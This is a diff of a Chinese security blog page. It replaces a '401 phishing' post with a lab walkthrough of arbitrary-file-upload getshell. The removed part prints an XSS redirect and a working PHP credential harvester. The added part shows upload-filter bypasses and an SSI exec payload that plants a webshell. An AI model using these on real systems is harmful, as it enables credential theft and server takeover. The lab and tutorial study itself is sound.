@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="401钓鱼, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
-    <meta name="description" content="配合URL跳转的一次401钓鱼实践笔记。">
+    <meta name="keywords" content="任意文件上传, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
+    <meta name="description" content="【权限越大 责任越大】任意文件上传Getshell。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>401钓鱼 | Cat00011cat</title>
+    <title>任意文件上传 | Cat00011cat</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -338,12 +338,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218021317.jfif')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">401钓鱼</h1>
+                    <h1 class="description center-align post-title">任意文件上传</h1>
                 </div>
             </div>
         </div>
@@ -390,28 +390,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-13
+                    2020-02-25
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-18
+                    2020-02-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    444
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
 				
@@ -427,38 +427,118 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="一、XSS-URL-跳转"><a href="#一、XSS-URL-跳转" class="headerlink" title="一、XSS URL 跳转"></a>一、XSS URL 跳转</h3><p>测试账号：13140000000<br>JS跳转代码：</p>
-<pre><code>&lt;script language="JavaScript" type="text/javascript"&gt;window.location.href='YOU URL'; &lt;/script&gt;</code></pre><p>当我们将其插入到有XSS漏洞的地方，网页会立马跳转到我们的网页</p>
-<p>那么如何去掉反弹，让网页不在跳转到其它页面呢？？</p>
-<p>首先开启BURP抓包，然后进入含有我们插入XSS URL恶意跳转的页面，进行抓包拦截；单击右键-Do intercept-response to this request （抓取返回包） 接着点击 放过 ；等待BURP抓取返回包（服务器传输给客户端的数据包）在返回包里找到我们那段代码将其删除，这样网页就不会跳转了；最后在最初我们插入XSS跳转代码的地方，将这段恶意代码彻底的删除。这样就OK了。</p>
-<p><strong>图文过程：</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115758.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115759.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115800.png" alt=""></p>
-<p><strong>去掉反弹跳转过程</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115801.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115804.png" alt=""></p>
-<p>响应包：</p>
-<p>思路：在响应包里找到我们插入的恶意代码，将其删除，并且放过数据包。从而不让客户端跳转到其他页面。进而回到客户端添加代码的地方，将其永久删除。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115805.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115802.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115803.png" alt=""></p>
-<p>完成。</p>
-<h3 id="二、401登录认证钓鱼"><a href="#二、401登录认证钓鱼" class="headerlink" title="二、401登录认证钓鱼"></a>二、401登录认证钓鱼</h3><p>首先代码：保存为1.php</p>
-<pre><code>
-&lt;?php
+                <h1 id="任意文件上传漏洞理论"><a href="#任意文件上传漏洞理论" class="headerlink" title="任意文件上传漏洞理论"></a>任意文件上传漏洞理论</h1><ul>
+<li><p>基础知识权限的划分：</p>
+<p>1、来宾权限                （仅仅只能浏览网站的权限）</p>
+<p>2、会员权限                （可以浏览到来宾无法访问的页面）</p>
+<p>3、后台权限                （对网站的日常管理操作）</p>
+<p>4、SHELL权限             （对网站文件的增删改差权限）</p>
+<p>5、服务器权限             （可以管理整个网站，包括停止网站的运行）</p>
+<p>6、域控权限                 （可以管理整个域内所有服务器的控制权限）</p>
+<pre><code> 7、管理人员PC            （可以管理公司的所有网络设备）
 
-if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW'])) {
-    Header("WWW-Authenticate: Basic realm=\"USER LOGIN\"");
-    Header("HTTP/1.0 401 Unauthorized");
-} else {
-    @file_put_contents('./b4dboy.txt', $_SERVER['PHP_AUTH_USER'].'|'.$_SERVER['PHP_AUTH_PW']."\r\n", FILE_APPEND);
-    header("Location: http://xm013.nanguatv.xyz/index.php?g=Admin&amp;m=Index&amp;a=login");
-}
+ 8、社会工程学             </code></pre></li>
+</ul>
+<h4 id="上传漏洞的类型"><a href="#上传漏洞的类型" class="headerlink" title="上传漏洞的类型"></a>上传漏洞的类型</h4><ul>
+<li></li>
+<li></li>
+</ul>
+<h4 id="上传漏洞的几个要点"><a href="#上传漏洞的几个要点" class="headerlink" title="上传漏洞的几个要点"></a>上传漏洞的几个要点</h4><p>1、测试网站能上传文件</p>
+<p>2、文件的路径必须可知为相对路径            </p>
+<ul>
+<li><p>动态路径</p>
+<p>  文件路径被存储于数据库中，然后前端会显示一个文件的id给你，当你访问该文件  时，后端会根据你的id去数据库查询你的这个id的文件相对路径是多少，然后读取该文件展示给用户看。</p>
+</li>
+</ul>
+<p>示例：</p>
+<pre><code>/.upload/img.png
 
-?&gt;
-开启401</code></pre><p>接着创建文件 .htaccess 写入内容</p>
-<pre><code>Options +FollowSymlinks -Multiviews RewriteEngine On #Authorization Headers RewriteCond %{HTTP:Authorization} ^(.+)$ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><script>
+index.php?type=downlad&amp;id=1</code></pre><p>这里可以测试越权和注入</p>
+<p><strong>获取路径的思路：</strong></p>
+<ul>
+<li>报错显路径</li>
+</ul>
+<p>我们可以通过对文件名增加一些恶意的字符，进行FUZZ，使其报错，从而显示路径；删除数据包的一些参数</p>
+<ul>
+<li>附件另类目录</li>
+</ul>
+<blockquote>
+<p>相对路径与绝对路径的区别？</p>
+</blockquote>
+<p>相对路径：网站跟目录到文件所在目录为相对路径</p>
+<p>绝对路径：从当前磁盘第一级目录到文件所在路径为绝对路径</p>
+<p>3、上传的文件后缀名必须为可执行脚本后缀</p>
+<pre><code>容器好比中国人，脚本文件好比外国妞
+
+所以用汉话和外国妞交流那肯定不行。</code></pre><p>4、上传的文件必须可以被解析</p>
+<p>案例：Apache禁止解析可执行脚本文件</p>
+<p>思路：</p>
+<p>面对禁止执行可执行脚本的任意文件上传漏洞，我们可以通过上传<code>.HTML</code>文件来扩大危害。</p>
+<h4 id="上传怎么就获取到了SHELL权限？"><a href="#上传怎么就获取到了SHELL权限？" class="headerlink" title="上传怎么就获取到了SHELL权限？"></a>上传怎么就获取到了SHELL权限？</h4><p>必须上传可执行脚本文件后缀</p>
+<h5 id="小马与大马的却别？"><a href="#小马与大马的却别？" class="headerlink" title="小马与大马的却别？"></a>小马与大马的却别？</h5><p>小马代功能少，文件小，需要第三方软件支持</p>
+<p>大马功能强大，文件大，不需要第三方软件进行操控</p>
+<h4 id="WAF防护原理与绕过"><a href="#WAF防护原理与绕过" class="headerlink" title="WAF防护原理与绕过"></a>WAF防护原理与绕过</h4><ul>
+<li>WAF类型</li>
+</ul>
+<ol>
+<li>基于PC电脑二进制软件</li>
+</ol>
+<p>360杀毒、电脑管家、金山毒霸……</p>
+<p>  2.基于WEB安全的的WAF软件</p>
+<p>安全狗、云锁….</p>
+<p>  3.基于WAF云WAF</p>
+<p>加速乐WAF、百度云WAF、阿里云盾</p>
+<p>  4.基于硬件类型的WAF</p>
+<blockquote>
+<h5 id="绕过思路："><a href="#绕过思路：" class="headerlink" title="绕过思路："></a>绕过思路：</h5></blockquote>
+<p>首先思考，他是如何判断我们上传的不是.jpg后缀，，，，而是.php后缀？</p>
+<pre><code>filename="shell.php"</code></pre><p>它是通过正则提取出来，进行判断的。那我们可以添加两个等号打破它的正则判断。骗过机器从而进行绕过。     （打破了机器的运算逻辑）</p>
+<pre><code>filename=="shell.php"</code></pre><p>用空格分隔.php</p>
+<pre><code>filename="shell.ph p"</code></pre><h1 id="文件任意上传靶场复现过程："><a href="#文件任意上传靶场复现过程：" class="headerlink" title="文件任意上传靶场复现过程："></a>文件任意上传靶场复现过程：</h1><h3 id="搭建上传环境："><a href="#搭建上传环境：" class="headerlink" title="搭建上传环境："></a>搭建上传环境：</h3><p>1、这里直接本地搭建，进行复现，使用集成面板PHPstudy2018版本</p>
+<p>其它版本可能会导致SSI配置出错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225144826.png" alt=""></p>
+<p>2、靶场使用的是pikaqiu靶场；访问127.0.0.1/pikaiqu 点击安装即可</p>
+<h3 id="Apache开启SSI"><a href="#Apache开启SSI" class="headerlink" title="Apache开启SSI"></a>Apache开启SSI</h3><p>我的Apache配置文件存放在<code>D:\phpStudy\PHPTutorial\Apache\conf\httpd.conf</code></p>
+<p>1、找到401行左右</p>
+<pre><code>#AddType text/html .shtml
+#AddOutputFilter INCLUDES .shtml</code></pre><p>把前面的#去除即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225143707.png" alt=""></p>
+<p>2、同文件下，找到</p>
+<pre><code>Options +Indexes +FollowSymLinks +ExecCGI</code></pre><p>大约在225行左右，代码最后加上 </p>
+<pre><code>Options +Indexes +FollowSymLinks +ExecCGI +INCLUDES</code></pre><p>如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225143602.png" alt=""></p>
+<p>因为我的是PHPstudy有个+号，宝塔的话去除+号即可。</p>
+<p>3、测试配置</p>
+<p>在<code>D:\phpStudy\PHPTutorial\WWW\pikaqiu\vul\unsafeupload\uploads</code>创建一个.shtml文件,写入显示IP的代码：</p>
+<pre><code>&lt;!--#echo var="REMOTE_ADDR" --&gt;</code></pre><p><a href="https://www.cnblogs.com/101key/p/3956323.html" target="_blank" rel="noopener">SSI指令详解</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225145417.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225145502.png" alt=""></p>
+<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>1、靶场只能上传图片格式的文件，但是我们可以将含有代码的文件后缀改为jpg通过burp抓包，在传输的过程中将1.jpg文件后缀改为1.shtml后缀。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225150158.png" alt=""></p>
+<p>2、上传完之后，我们发现文件存储路径直接显示出来，那就不用去猜路径啦。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225150339.png" alt=""></p>
+<p>假设网页不显示路径的话，我们可以通过抓包该参数让网页报错，从而显示路径。</p>
+<p>如图：添加<code>\</code>使其报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225152342.gif" alt=""></p>
+<p>3、假设网站禁止解析可执行脚本或者禁止上传；文件开启SSI；那么我们可以通过上传<code>.jpg + .bat + .shtml</code>三种格式文件配合使用，扩大化危害，从而获取shell权限。</p>
+<ul>
+<li><p>将大马.php后缀改为.jpg进行上传；</p>
+</li>
+<li><p>上传一个1.jpg文件，抓包改为1.bat；并且 数据包中加入移动的代码</p>
+<ul>
+<li><code>move D:\phpStudy\PHPTutorial\WWW\pikaqiu\vul\unsafeupload\uploads\1.jpg D:\phpStudy\PHPTutorial\WWW\1.php</code></li>
+</ul>
+</li>
+<li><p>在上传1.jpg，抓包改为1.shtml；并且 数据包加入SSI指令</p>
+</li>
+</ul>
+<pre><code>&lt;!--#exec cmd="D:\phpStudy\PHPTutorial\WWW\pikaqiu\vul\unsafeupload\uploads\1.bat"--&gt;</code></pre><p>都上传成功了，最后访问<a href="http://192.168.1.104/pikaqiu/vul/unsafeuplasd/uploads/1.shtml" target="_blank" rel="noopener">http://192.168.1.104/pikaqiu/vul/unsafeuplasd/uploads/1.shtml</a> 即可；随后网页相应 成功移动一个文件。</p>
+<ul>
+<li>域名/1.php 成功访问大马。</li>
+</ul>
+<p>整个过程：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200225163634.gif" alt=""></p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -501,7 +581,7 @@ if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW']))
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.thecat.top/posts/25443.html">http://www.thecat.top/posts/25443.html</a>
+                    <a href="http://www.thecat.top/posts/48987.html">http://www.thecat.top/posts/48987.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -711,7 +791,7 @@ if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW']))
         repo: 'Leaving-a-message',
         owner: 'lateral404',
         admin: "lateral404",
-        id: '2020-02-13T23-31-33',
+        id: '2020-02-25T02-31-33',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -995,45 +1075,47 @@ if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW']))
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/48769.html">
+                <a href="/posts/48987.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218001734.jfif" class="responsive-img" alt="硬盘故障">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" class="responsive-img" alt="任意文件上传">
                         
-                        <span class="card-title">硬盘故障</span>
+                        <span class="card-title">任意文件上传</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            关于一次移动硬盘插入电脑可以识别设备，驱动也没问题，但是计算机不显示硬盘文件夹问题解决方案。
+                            【权限越大 责任越大】任意文件上传Getshell。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/IT%E6%8A%80%E6%9C%AF/" class="post-category">
-                                    IT技术
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/IT%E6%8A%80%E6%9C%AF/">
-                        <span class="chip bg-color">IT技术</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
@@ -1047,30 +1129,30 @@ if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW']))
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/30324.html">
+                <a href="/posts/61123.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209160430.jfif" class="responsive-img" alt="快速查看端口被谁占用了">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" class="responsive-img" alt="Sqlmap安装笔记">
                         
-                        <span class="card-title">快速查看端口被谁占用了</span>
+                        <span class="card-title">Sqlmap安装笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            快速查看端口被XXX占用。
+                            Sqlmap安装超详细步骤。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-23
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/IT%E6%8A%80%E6%9C%AF/" class="post-category">
-                                    IT技术
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
                                 </a>
                             
                             
@@ -1080,8 +1162,8 @@ if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW']))
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/IT%E6%8A%80%E6%9C%AF/">
-                        <span class="chip bg-color">IT技术</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
